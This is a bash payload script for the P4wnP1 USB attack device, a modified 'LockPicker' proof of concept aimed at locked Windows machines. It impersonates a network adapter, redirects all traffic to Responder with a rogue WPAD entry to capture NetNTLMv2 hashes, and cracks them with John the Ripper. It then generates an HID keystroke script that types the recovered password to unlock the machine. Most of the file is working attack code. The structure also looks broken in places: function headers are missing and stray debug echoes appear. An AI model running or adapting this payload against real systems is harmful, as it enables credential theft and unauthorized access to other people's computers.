	#    This file is part of P4wnP1.
#
#    Copyright (c) 2017, Marcus Mengs. 
#
#    P4wnP1 is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    P4wnP1 is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.



# P4wnP1 LockPicker demo payload by MaMe82
# ==========================
# Author: MaMe82
#
# Runs an extended version of "Snagging creds from locked machines"
# which was presented by Rob 'MUBIX' Fuller
#
# Instead of only capturing the hashes, they will be handed over to JtR for
# cracking and typed out via HID keyboard on success, to unlock the box.
# This succeeds if the target has set a weak password.
#
# As the base issue should have been patched (MS16-112), capturing hashes shouldn't succeed in most cases
# 
# The payload chooses a random USB PID, to raise the likelyhood of carrying out the
# attack multiple times (Windows re-installs the drivers and thus assigns a new network. 
# This raises the chance of forcing the target into doing an NTLM authenticated requests
# to the WPAD source)
#
# The payload part which enters the password has been tested against Win7 and Win10 
# (it presses CTRL+ALT+DEL multiple times to assure the login screen is ready to receive a password input)
#
# To make this work in a test case with some test user account:
# 1) set a weak password like 'password' or '123456'
# 2) lock the target machine (to raise the chance of capturing hashes leave a browser open)
# 3) Don't forget to SET THE CORRECT TARGET LANGUAGE IN THIS SCRIPT, BY ALTERING THE "lang" PARAMETER
# 4) Attach P4wnP1 and let it do his work (be sure to have this payload set in setup.cfg)
# 5) If you want to follow along status output attach a monitor to P4wnP1s HDMI port
#
#
# LED states:
# 1 blink:		Target initialized network
# 2 blinks:		Responder is up and listening
# 3 blinks:		A hash is captured and JtR tries to crack it 
#				- at this point you could unplug P4wnP1, and walk away with the hash stored in "collected/" folders
#				- or you leave JtR running
# 4 blinks: 	JtR cracked the hash
#				- this is barely visible, as P4wnP1 ultimately tries to enter the password and moves to finish
#			     state (solid LED)
#			    - if cracking succeeded, but login failed, the password is stored to a file with ".cracked" extension
# solid LED: 	payload finished execution 
#
# Remarks:
#	This is a PoC payload which show several techniques:
#		- combining network and keyboard attacks
#		- force Windows to reinstall drivers (random USB PID)
#		- capturing traffic of the whole IPv4 range (combine static routing with 1 bit network mask
#		  with iptables REDIRECT rules to catch the traffic destinated to foreign targets)
#
#   The payload is limited to ASCII based passwords (due to the nature of underlying keyboard iplementation
#	which isn't able to handle UNICODE)
#
#	As stated, the issue responsible for emitting the NetNTLMv2 hashes from locked Windows machines should
#	be patched. Anyway, there's a ton of software, spitting out the hashes (one is mentioned in P4wnP1 README.md).
#	Having a browser running on the locked machine, raises chances to grab a hash (forced access to a rouge SMB\
#	server after redirecting the HTTP request to Responder.py)

# =============================
# USB setup
# =============================
# Make sure to change USB_PID if you enable different USB functionality in order
# to force Windows to enumerate the device again
USB_VID="0x1d6b"        # Vendor ID
USB_PID=$(printf "0x%04X" $RANDOM)        # Random PID to raise chance of driver reinstall

USE_ECM=false            # we need no Linux/Mac networking
USE_RNDIS=true          # RNDIS network device to enable hash stealing
USE_HID=true            # HID keyboard to allow entering cracked password
USE_UMS=false           # no mass storage

lang="fr" # MAKE THE KEYBOARD LANGUAGE MATCH THE TARGET
wdir=/root
# ==========================
# Network and DHCP options
# ==========================

IF_IP="172.16.0.1" # IP used by P4wnP1
IF_MASK="255.255.255.252" 
IF_DHCP_RANGE="172.16.0.2,172.16.0.2" # DHCP Server IP Range
active_interface=wlan0
ROUTE_SPOOF=true # set two static routes on target to cover whole IPv4 range, raise chance of capturing packets with hashes
WPAD_ENTRY=true # provide a WPAD entry via DHCP pointing to responder


# define some helper functions and custom vars
CRACK=true # enable cracking of dumped hashes on P4wnP1
LOGIN=true # enable Login attempt if hash is cracked

function responder_db_contains_data()
{
echo prout
	responder_db="/root/Responder/Responder.db"

	if [ -f $responder_db ]; then
		if [ $(wc -c < $responder_db) -gt "0" ]; then
			return 0
		else
			return 1
		fi
	else
		return 1
	fi
}

function check_for_hash()
{
echo megaprout
	# exclude hashes for "SMB\"
	if [[ $(sqlite3 /root/Responder/Responder.db "select fullhash from responder where not user='SMB\'") ]]; then
		return 0
	else
		return 1
	fi
}

function get_hash()
{
	# exclude hashes for "SMB\"
	sqlite3 -line /root/Responder/Responder.db "select fullhash from responder where not user='SMB\'" | cut -d " " -f3
}

function kill_responder()
{
	sudo kill $(ps -aux | grep "Responder.py" | grep -v -e "bash" | grep -v -e "grep" | awk '{print $2}')
}

function extract_password()
{
	# assumes there's only one password which has been cracked 
	john --pot=/tmp/john.pot --show $1 | grep ":" | cut -d":" -f2
}

# This function gets called after the target network interface is working
# (RNDIS, CDC ECM or both have to be enabled)
	# blink one time, when network is up
#	led_blink 1
	
	# redirect unicast traffic for every destination to responder (cacth packets sent to our huge subnet ;-) )

    iptables -t nat -A PREROUTING -i $active_interface --protocol tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
    iptables -t nat -A PREROUTING -i $active_interface --protocol udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
	echo "Starting responder..."

	# delete Responder.db
	rm $wdir/Responder/Responder.db

	# start responder in screen session
        bash -c "cd /root/Responder/; python3 Responder.py -I $active_interface -DdwrF -u http://prout:@172.16.0.1/wpad.dat" &
	touch /tmp/responder_started

	echo "Starting responder started."
	
	# blink two times when responder is started
#	led_blink 2

# this function gets called if the target received a DHCP lease
# (DHCP client has to be running on target)

	echo "Waiting for hashes to arrive "

	# wait till hashes have been grabbed (exluding hashes for host\user "SMB\"
	until responder_db_contains_data && check_for_hash; do
		sleep 0.5 # 500 ms delay before recheck
	done
	
	echo

	# at this point we should have one or more hashes, so we save them and kill responder
	
	
	fname="$target_name""_""$target_ip"
	# count existing folders of this name
	fcount=$(ls -la $wdir/collected/ | grep "$fname" | wc -l)
	fname="$fname""_""$fcount"".hashes"

	hashfile=$wdir/collected/$fname
	
	get_hash > $hashfile
	chown -R root:root $wdir/collected
	sync
	echo "Captured the following hashes:"
	cat $hashfile
	kill_responder

	# LED to solid, when hash is captured
#	led_blink 255 # set LED to solid on
	
	if $CRACK; then
	#	led_blink 3
		echo "Starting JtR and trying to crack..."
		# use temporary pot file (known hashes will be cracked again)
		john --pot=/tmp/john.pot $hashfile
		echo "All given hashes cracked!!!"
		sync

				
	#	led_blink 4
		# store a backup of cracked hash
		john --show --pot=/tmp/john.pot $hashfile | tee $hashfile.cracked

	#	led_blink 255 # set LED to solid on
		
	fi

	# from here we could start entering the passwords one by one (depending on target OS is needed on too many failed attempts)
	#led_blink 255 # set LED to solid on
	
	if $LOGIN; then
		# we assume theres only one password
		extract_password $hashfile > /tmp/login
		sync
	fi
	
	#led_blink 255 # set LED to solid on
	
	if $LOGIN; then
		# wait till a file with login password is created
		until [ -f /tmp/login ]; do 
			sleep 1
			echo .
		done
		
		
		until [ $(wc -c < /tmp/login) -gt "0" ]; do sleep 1; echo .; done
		sync
		
		# to avoid get the password screen input ready we press CTRL+ALT+DEL, multiple times (to allow wake up)
			
		pass=$(cat /tmp/login)
		
		echo "Trying to login with password: $pass"
		#led_blink 4
		
		# We target Win 10, which needs a keypress to bring the password prompt up (we're pressing a)
		# addtiotionally, we assume that the keyboard is up and running at this point
		
	fi		
echo "[+] Finished!"

# Create HID script
echo "layout(\"fr\")" > /usr/local/P4wnP1/HIDScripts/smbrute.js
echo "press(\"ESC\")" >>/usr/local/P4wnP1/HIDScripts/smbrute.js
echo "press(\"ESC\")" >>/usr/local/P4wnP1/HIDScripts/smbrute.js
echo "delay(1000)" >>/usr/local/P4wnP1/HIDScripts/smbrute.js
echo "type(\"${pass}\")" >> /usr/local/P4wnP1/HIDScripts/smbrute.js
echo "press(\"ENTER\")" >>/usr/local/P4wnP1/HIDScripts/smbrute.js

P4wnP1_cli hid run -n smbrute.js >/dev/null

